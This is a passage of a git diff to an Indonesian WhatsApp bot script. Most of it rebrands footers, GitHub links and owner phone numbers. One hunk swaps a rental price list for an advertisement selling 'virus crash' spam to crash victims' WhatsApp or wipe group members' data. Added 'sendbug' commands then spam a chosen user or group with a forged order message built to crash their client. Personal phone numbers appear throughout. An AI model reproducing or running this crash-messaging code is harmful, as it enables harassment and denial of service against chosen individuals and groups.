-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
@@ -4039,17 +4049,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -4087,7 +4097,7 @@ case 'summersand':
 case 'horrorblood':{
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 
-if (args.length == 0) return replyNya(`Example: ${prefix + command} Nabb Botz`)
+if (args.length == 0) return replyNya(`Example: ${prefix + command} Ryuuka`)
 sticWait(from)
 ini_txt = args.join(" ")
 imagenya = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`)
@@ -4098,17 +4108,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -4131,17 +4141,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -4239,17 +4249,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By © Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -4294,17 +4304,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -4326,7 +4336,7 @@ case 'wallgravity':
 case 'coolgravity':{
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 
-if (args.length == 0) return replyNya(`Example: ${prefix + command} Nabb Botz Botz`)
+if (args.length == 0) return replyNya(`Example: ${prefix + command} Ryuuka`)
 sticWait(from)
 txt1 = args[0]
 txt2 = args[1]
@@ -4338,17 +4348,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By © Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -4398,17 +4408,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -4435,17 +4445,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Back To Menu","id": `${prefix}menu`}}]
@@ -4477,17 +4487,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix + command}`}}]
@@ -4638,7 +4648,7 @@ var button = [
 		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
 		]
         var hg = `「 Memancing 」\n\n • Tangkapan : ${ikannya}\n • Total Dapat : ${ditangkap} Ikan\n • MONEY : $${coin}\n • EXP : ${xp}Xp`
-        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: cing }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: cing }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(mess.error))
 }, 6000)
 setTimeout( () => {
@@ -4677,7 +4687,7 @@ var button = [
 		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
 		]
         var hg = `「 DEATH 」\n\n • Tempat  ${ad}\n • MONEY : $${money}\n • EXP : ${adven}Xp`
-        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: hasm }, templateButtons: button, footer: `Rpg Game By NabbBotz`, mentions: [sender] })
+        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: hasm }, templateButtons: button, footer: `Rpg Game By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`, mentions: [sender] })
         .catch ((err) => reply(mess.error))
 }, 7000)
 setTimeout( () => {
@@ -4725,17 +4735,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix + command}`}}]
@@ -4757,17 +4767,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix + command}`}}]
@@ -4790,17 +4800,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: pll,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 },
 {"quickReplyButton": {"displayText": "Next","id": `${prefix + command}`}}]
@@ -4815,32 +4825,65 @@ ya = '```'
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 sewbot = `Hai *${pushname}*
 
-List Sewabot
-5k/Minggu
-7k/Bulan
-10k/Manent
-Note : *Keuntungan Sewabot?*
-Bisa Masukin Bot Ke Group
+「ᴊᴀꜱᴀ ꜱᴘᴀᴍ ʙᴜɢ ᴄʀᴀꜱʜ ɴᴇᴡ ᴇʀᴀ 2022」
 
-List Premium
-6k/Minggu
-8k/Bulan
-20k/Manent
-Note : *Keuntungan Premium?*
-Bisa Gunain Fitur Premium Tanpa Batas
+🔥👹Spam Virus Crash By Ryuuka XD × Shield.Id👹🔥
+⿻」Bug New Auto Crash ( Spam Private Chat )
 
-List Sewabot & Premium
-17k/Minggu
-34k/Bulan
-50k/Manent
-Note : *Keuntungan Sewabot & Premium?*
-Bisa Masukin Bot Ke Group & Bisa Gunain Fitur Premium Tanpa Batas
+- spam 1× crash = 5Rb
+- spam 2× crash = 10Rb
+- spam 3× crash = 15Rb
 
-List Payment
-GOPAY : Scan Qr Di Atas
-OVO : 081938835391
+( ᴋᴇʟᴇʙɪʜᴀɴ? ) :
+- ᴋᴏʀʙᴀɴ ᴀᴜᴛᴏ ᴄʀᴀꜱʜ
+- ᴋᴏʀʙᴀɴ ᴀᴜᴛᴏ ʀᴇꜱᴇᴛ ᴡʜᴀᴛꜱᴀᴘᴘ
+- ᴋᴏʀʙᴀɴ ᴀᴜᴛᴏ ᴘᴀɴɪᴋ
 
-Note : MAU SEWA & PREM APA MAU LIAT DOANG ANJING
+⿻」Bug New Auto Crash ( Spam Grup Target, Cocok buat lu yang dendam ama grup musuh kalian )
+
+- spam 1× crash = 5Rb
+- spam 2× crash = 10Rb
+- spam 3× crash = 15Rb
+
+( ᴋᴇʟᴇʙɪʜᴀɴ? ) :
+- ꜱᴇᴍᴜᴀ ᴍᴇᴍʙᴇʀ ᴋᴇɴᴀ 
+- ᴍᴇᴍʙᴇʀ ᴀᴜᴛᴏ ʜᴀᴘᴜꜱ ᴅᴀᴛᴀ
+- ʙᴜɢ ʙᴇʀꜱɪꜰᴀᴛ ɪɴᴠɪꜱɪʙʟᴇ
+
+「ザ𝐁𝐔𝐊𝐓𝐈😪」
+
+Bukti? Baru Juga Buka, Dijamin Pokoknya Aman 100%
+Minat? Chat Aku Aja Om wa.me/6282134110253
+Minat? Chat Aku Aja Om wa.me/6281546767920
+
+Sistem Pembayaran Spam Virus : Send Nomor - TF Dana - Spam - Done
+
+Via Dana : ☎️ +6282134110253 (Admin Ryuuka)
+Via Dana : ☎️ +6281546767920 (Admin Shield.id)
+
+Selain bukan nomor di atas (FAKE)
+
+𝐒𝐎𝐂𝐈𝐀𝐋 𝐌𝐄𝐃𝐈𝐀 🎭🥇
+
+『𖤛』Ａｃｃｏｕｎｔ Ｉｎｓｔａｇｒａｍ :
+        ➭ https://www.instagram.com/_story.wangsaf
+『𖤛』Ａｃｃｏｕｎｔ Ｙｏｕｔｕｂｅ :
+        ➭ https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ
+『𖤛』Ａｃｃｏｕｎｔ Ｔｉｋｔｏｋ :
+       ➭ tiktok.com/@ryuuka_senpaiii
+
+❖°❀❬ Ｒｙｕｕｋａ sᴇɴᴘᴀɪ メ ꜱʜɪᴇʟᴅ.ɪᴅ ❭❀°❖
+➥ ᴬᵈᵐⁱⁿ ᴿᵃᵐᵃʰ ᵏᵒᵏ
+➥ ᴷᵃˡᵃᵘ ᴬᵈᵐⁱⁿ ˢˡᵒʷ ᴿᵉˢᵖᵒⁿ, ʸᵃ ᵐᵃᵃᶠ ᵏᵉʳʲᵃᵃⁿ ᵏⁱᵗᵃ ʲᵘᵍᵃ ᵇᵃⁿʸᵃᵏ
+➥ ᴷᵃᵐⁱ ʰᵃⁿʸᵃ ⁿᵍᵉˡᵃʸᵃⁿⁱⁿ ᵒʳᵃⁿᵍ ʸᵃⁿᵍ ˢᵉʳⁱᵘˢ ᵐᵃᵘ ᵒʳᵈᵉʳ
+➥ ᴵⁿⁱ ᵛⁱʳᵘˢ ᵇᵘᵏᵃⁿ ˢᵉᵖᵉʳᵗⁱ ᵛⁱʳᵗᵉˣ ᵃᵗᵃᵘᵖᵘⁿ ˢˡᵃʸᵉʳ, ⁱⁿⁱ ᵛⁱʳᵘˢ ⁱⁿᵛⁱˢⁱᵇˡᵉ, ᵏⁱʳⁱᵐ ᵏᵉ ᵗᵃʳᵍᵉᵗ ᵗᵃⁿᵖᵃ ᵏᵉᵗᵃʰᵘᵃⁿ
+➥ ᴴᵃʳᵍᵃⁿʸᵃ ᵃˢˡⁱⁿʸᵃ ᵐᵃʰᵃˡ, ᶜᵘᵐᵃⁿ ˢᵃʸᵃ ᵗᵃᵘ ᵒʳᵃⁿᵍ ᴵⁿᵈᵒⁿᵉˢⁱᵃ ˢᵉᵖᵉʳᵗⁱ ᵃᵖᵃ, ᵖᵃˢᵗⁱ ᵍᵃᵐᵃᵘ ᵏᵃˡᵃᵘ ʰᵃʳᵍᵃ ᵐᵃʰᵃˡ, ʲᵃᵈⁱ ᵃᵏᵘ ᵖᵘᵗᵘˢᵏᵃⁿ ʰᵃʳᵍᵃⁿʸᵃ ᵐᵘʳᵃʰ ˢᵃʲᵃ
+➥ ᴷᵃᵐⁱ ᵏᵘʳᵃⁿᵍ ᵇᵃⁱᵏ ᵃᵖᵃ ᶜᵘᵇᵃ, ᵛⁱʳᵘˢ ʸᵃⁿᵍ ᵇⁱˢᵃ ᵇⁱᵏⁱⁿ ᶜʳᵃˢʰ ᵈⁱ ʲᵘᵃˡ ᵐᵘʳᵃʰ, ˢᵉᵈᵃⁿᵍᵏᵃⁿ ᵒʳᵃⁿᵍ ʸᵃⁿᵍ ᵈⁱ ˡᵘᵃʳ ˢᵃⁿᵃ ᵛⁱʳᵗᵉˣ ᵈⁱʲᵘᵃˡ ᵐᵃʰᵃˡ
+➥ ᴰᵒⁿᵗ ˢᵖᵃᵐ & ᶜᵃˡˡ
+➥ ᴬʳⁱᵍᵃᵗᵒᵘ ᴳᵒᶻᵃⁱᵐᵃˢᵘ! ᴮᵘᵃᵗ ʸᵃⁿᵍ ᵖᵉʳⁿᵃʰ ᵒʳᵈᵉʳ
+❖°❀❬ Ｒｙｕｕｋａ sᴇɴᴘᴀɪ メ ꜱʜɪᴇʟᴅ.ɪᴅ ❭❀°❖
+
+Note : MAU ORDER APA MAU LIAT DOANG ANJING
 ${ya}Jika Sudah Membayar Silahkan Kirim Bukti Screenshot Ke Button Url Di Bawah${ya}`
 let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
 const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -4848,12 +4891,12 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: sewbot,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [
 {
 urlButton: {
-displayText: 'Owner Nabb Botz',
-url: 'https://wa.me/62882016646288'
+displayText: 'Owner ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -4864,13 +4907,13 @@ kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
 break
 case 'payment': case 'donasi': {
 if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
-donte = `_MAU BAYAR YA KAK_
-GOPAY : Scan Qr Di Atas
+donte = `_MAU DONASI YA KAK_
+DANA : Scan Qr Di Atas
 
 
 *NOTE :*
-MAU BAYAR APA LIAT DOANG ANJING
-JIKA SUDAH BAYAR KIRIM BUKTI 
+MAU DONASI APA LIAT DOANG ANJING
+JIKA SUDAH DONASI KIRIM BUKTI 
 SCREENSHOT KE NOMOR OWNER`
 let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
 const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -4878,17 +4921,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: donte,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ShinChanYucan',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Nabb Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -4896,6 +4939,142 @@ url: 'https://wa.me/62882016646288'
 }), { userJid: m.chat, quoted: m })
 kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
 }
+break
+case 'sendbug' : {
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+a = await kirbotz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+}
+replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
+break
+case 'sendbuggc' : {
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+a = await kirbotz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－Ｒｅａｃｔ"}, {quoted: a})
+}
+replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
+break
+case 'sendbugnew' : {
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+pek = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "orderMessage": {
+						"orderId": "3184312811796096",
+						"sellerJid": "6282134110253@s.whatsapp.net",
+						"itemCount": 999999999999999,
+						"status": "INQUIRY",
+						"surface": "CATALOG",
+						"message": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${virshin()} ${ngazap}`,
+						"orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
+						 "token": "AR6eHHZTvi8k3qMfxWHBCvAXO+vG5VW/1QtpiPpxL3Tfyg=="
+            }, 
+        } 
+    }
+kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text:"⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+}
+replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
+break
+case 'sendbuggcnew' : {
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+pek = { 
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "orderMessage": {
+						"orderId": "3184312811796096",
+						"sellerJid": "6282134110253@s.whatsapp.net",
+						"itemCount": 9999999999,
+						"status": "INQUIRY",
+						"surface": "CATALOG",
+						"message": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ${virshin()} ${ngazap}`,
+						"orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
+						 "token": "AR6eHHZTvi8k3qMfxWHBCvAXO+vG5VW/1QtpiPpxL3Tfyg=="
+            }, 
+        } 
+    }
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"},{quoted:pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+await sleep(10000)
+kirbotz.sendMessage(Pe, {text: "⫹⫺ Ｒｙｕｕｋａ－ＸＤ"}, {quoted: pek})
+}
+replyNya('Sukses Send Bug By ⫹⫺ Ｒｙｕｕｋａ－ＸＤ')
 break
 case 'join': {
 if (!isCreator) throw mess.owner
@@ -5493,7 +5672,7 @@ title: a.title, description: `Channel: ${a.author.name} | Durasi: ${a.duration}`
     const button = {
         title: `Hasil Pencarian Dari ${q}`,
         description: "Silahkan Tap Tombol Dibawah!",
-        footerText: `Create By NabbBotz`,
+        footerText: `Create By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫`,
         buttonText: 'Tap Disini!',
         listType: 'SINGLE_SELECT',
         sections: [
@@ -5659,17 +5838,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: txt,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -5703,17 +5882,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: txt,
-hydratedFooterText: 'Created By Wz Botz',
+hydratedFooterText: 'Created By ⫹⫺ Ｒｙｕｕｋａ－ＭＤ 仫',
 hydratedButtons: [{
 urlButton: {
 displayText: 'MyGithub',
-url: 'https://github.com/Wz Botz'
+url: 'https://github.com/ShinChanYucan'
 }
 },
 {
 urlButton: {
 displayText: 'MyOwner',
-url: 'https://wa.me/62882016646288'
+url: 'https://wa.me/6282134110253'
 }
 }]
 }
@@ -5743,17 +5922,17 @@ templateMessage: {
 hydratedTemplate: {
 imageMessage: message.imageMessage,
 hydratedContentText: txt,
